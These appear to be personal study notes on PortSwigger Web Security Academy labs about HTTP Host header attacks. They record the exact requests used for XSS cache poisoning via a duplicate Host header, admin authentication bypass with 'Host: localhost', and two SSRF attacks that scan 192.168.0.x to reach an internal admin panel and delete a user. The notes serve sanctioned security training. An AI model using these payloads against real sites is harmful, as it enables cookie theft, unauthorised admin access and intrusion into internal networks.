<span style="color:yellow;font-weight:700;font-size:30px">
HTTP Host header attacks
</span>
https://portswigger.net/web-security/host-header

# How to identify and exploit HTTP Host header vulnerabilities
https://portswigger.net/web-security/host-header/exploiting

How to identify and exploit HTTP Host header vulnerabilities:
1. Check for flawed validation
2. Inject duplicate Host headers
3. Supply an absolute URL
4. Add line wrapping ( by indentation)
5. Inject host override headers (X-Forwarded-Host / X-Host / X-Forwarded-Server / X-HTTP-Host-Override / Forwarded)


# ***1. Lab: Web cache poisoning via the Host header***
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
 To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser. 

 xss shit

 1. change original HH - observe 500 failed
 2. add another HH and change value to test - observe reflection in response
 3. experiment with different values until payload:

```
    Host: 0a18008d04cfbdb1c061c9350092009a.web-security-academy.net
    Host: blah"onerror=alert(document.cookie)//
```
note:


request field:
```
Cache-Control: max-age=0
```

response fields:
```
Cache-Control: max-age=30
Age: 28
X-Cache: hit
```

material:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control

**XSSed the Cache**


# ***2. Lab: Host header authentication bypass***
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass

To solve the lab, access the admin panel and delete Carlos's account. 

1. request admin panel - observe 401 unauthorised:
```
    GET / HTTP/1.1
    Host: 0ab2006f037c2dbbc013efc9004f0026.web-security-academy.net
```

response:
```
    HTTP/1.1 401 Unauthorized

```
2. change Host - experiment different values:
```
    127.0.0.1 - fails

```
payload:
```
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
```

#

# ***3. Lab: Routing-based SSRF***
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf

<!-- note: 
require collaborator? just for first stage of finding out if header is vulnerable so we can skip testing via collaborator (sorry for it - will be comleted with burp pro later) -->


1. send **GET /admin /HTTP1.1** to **intruder**, Change Host field to **192.168.0.x**, mark **x** with payload marker (§x§):

```
GET /admin HTTP/1.1
Host: 192.168.0.§0§
```

2. use intruder payload "number" and set:
```
from: 0
to: 255
step: 1
```

3. find the only response that is not **504** and send to repeater

4. send and observe we get admin panel in response with delete user interface

5. **request in browser** and send delete request: observe it fail. 

6. research in proxy. find out **host** changed back to original.

7. change to local adress and try again

# portswigger solution:

    in admin panel research delete form:
    observe method: **POST**
    observe path: **admin/delete** 
    observe required fields: **csrf - sVn2OQMP3K1id3suCsKbb2WgwH1iA8KU**
    username - 

resend message to repeater and change to craft a valid delete request:

    POST /admin/delete HTTP/1.1
    Host: 192.168.0.49
    ..

    csrf=sVn2OQMP3K1id3suCsKbb2WgwH1iA8KU&username=carlos

**DELETED**


# **4. Lab: SSRF via flawed request parsing**
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

 To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. 

<!-- collaborator stuf not realy necessery to solve (TBC) -->

change **GET / HTTP/1.1** to absolite URL:
**GET https://0af1000704da6058c07b1d8d00c200e4.web-security-academy.net/ HTTP/1.1** observe it allows arbitary headers. 

in intruder add **/admin** to the absolute URL and replace host header with 192.168.0.§0§ - to find the IP of the admin 
request:
    GET https://0af1000704da6058c07b1d8d00c200e4.web-security-academy.net/admin HTTP/1.1
    Host: 192.168.0.183

response:
    HTTP/1.1 302 Found
    Location: /admin

send to repeater, send again and follow redirection to the admin panel. find the CSRF value and copy it. change the request method to **POST** and enter the **csrf value** & **username value**. add the **/delete** and send:

request:
    POST https://0af1000704da6058c07b1d8d00c200e4.web-security-academy.net/admin/delete?username=carlos HTTP/1.1
    Host: 192.168.0.183

    csrf=67LxKpu1jyf0B0r8fD6r1VKjkFokO6of&username=carlos

see lab solved banner

# Done!













